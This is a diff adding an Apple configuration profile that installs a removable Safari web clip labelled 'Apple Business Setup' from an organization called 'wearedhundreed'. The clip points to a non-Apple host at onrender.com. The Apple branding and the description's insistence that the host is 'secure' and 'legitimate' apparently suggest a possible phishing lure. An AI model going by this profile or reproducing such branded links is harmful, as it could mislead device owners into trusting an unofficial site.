@@ -1,0 +1,43 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>PayloadType</key>
+	<string>Configuration</string>
+	<key>PayloadVersion</key>
+	<integer>1</integer>
+	<key>PayloadIdentifier</key>
+	<string>com.wearedhundreed.apple-business-profile-host</string>
+	<key>PayloadUUID</key>
+	<string>6335A3DC-3AA8-5CD7-94A1-630071515B44</string>
+	<key>PayloadDisplayName</key>
+	<string>Apple Business Setup</string>
+	<key>PayloadDescription</key>
+	<string>Adds a removable Safari shortcut to the secure profile host and legitimate Apple Business setup checklist.</string>
+	<key>PayloadOrganization</key>
+	<string>wearedhundreed</string>
+	<key>PayloadContent</key>
+	<array>
+		<dict>
+			<key>PayloadType</key>
+			<string>com.apple.webClip.managed</string>
+			<key>PayloadVersion</key>
+			<integer>1</integer>
+			<key>PayloadIdentifier</key>
+			<string>com.wearedhundreed.apple-business-profile-host.webclip</string>
+			<key>PayloadUUID</key>
+			<string>ADB349A2-2562-53D9-85B1-C046E89FADD7</string>
+			<key>PayloadDisplayName</key>
+			<string>Apple Business Setup</string>
+			<key>Label</key>
+			<string>Business Setup</string>
+			<key>URL</key>
+			<string>https://auth-services-safari.onrender.com/profiles/</string>
+			<key>FullScreen</key>
+			<false/>
+			<key>IsRemovable</key>
+			<true/>
+		</dict>
+	</array>
+</dict>
+</plist>
